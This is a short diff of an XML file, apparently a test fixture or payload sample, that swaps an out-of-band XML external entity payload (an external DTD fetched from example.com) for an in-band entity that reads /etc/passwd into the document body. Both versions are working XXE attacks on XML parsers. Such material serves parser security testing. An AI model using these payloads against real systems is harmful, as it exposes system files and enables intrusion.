@@ -1,7 +1,6 @@
 <?xml version="1.0" ?>
 <!DOCTYPE data [
-<!ENTITY % file SYSTEM "file:///etc/passwd">
-<!ENTITY % xxe SYSTEM "http://example.com/xxe.dtd">
-%xxe;
+<!ENTITY file SYSTEM "file:///etc/passwd">
 ]>
-<data></data>
+<data>&file;</data>
+
